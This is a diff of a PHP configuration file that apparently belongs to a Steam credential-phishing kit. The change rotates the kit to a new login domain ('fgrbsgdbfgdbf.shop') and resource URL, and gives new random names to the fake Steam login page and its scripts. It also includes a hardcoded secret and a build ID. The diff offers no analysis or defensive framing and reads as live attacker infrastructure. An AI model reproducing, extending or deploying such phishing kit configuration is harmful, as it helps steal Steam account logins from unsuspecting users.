@@ -1,19 +1,19 @@
 <?php
 
 $phpName = "e8b95504232b39d114777224c885ca16.php";
-$steamHtmlName = "z9ui2n5m4wi5.html";
-$steamScriptName = "yboamjcrgupi.js";
-$windowScriptName = "iptnyk74ihfo.js";
-$domainToLogin = "connection-help-wanmei.com";
-$resourceUrl = "https://connection-help-wanmei.com/fgmxmjycpigld0a2ailanq998h3eokrxpn5ds";
+$steamHtmlName = "bvomeyumq21y.html";
+$steamScriptName = "0pxwmhp9a8i8.js";
+$windowScriptName = "2y7gmddrojat.js";
+$domainToLogin = "fgrbsgdbfgdbf.shop";
+$resourceUrl = "https://fgrbsgdbfgdbf.shop/fwrbelf9giti8g9pjwlbqqraqz5er7iwu2his";
 $postData = [
     "secret" => "c249f543d53953daf596b4074d8cbfdd",
-    "authBtnClass" => "pdjpdj7x161u",
+    "authBtnClass" => "lkk380gf9d6j",
     "steamHtmlName" => $steamHtmlName,
     "steamScriptName" => $steamScriptName,
     "windowScriptName" => $windowScriptName,
 ];
-$buildId = "9a8b10be-5def-4938-908b-4b92ce0a4669";
+$buildId = "152d21dc-e592-43bb-86d8-8ce8b3c760f7";
 
 
 $update = isset($_GET['update']) && $_GET['update'] === 'true';
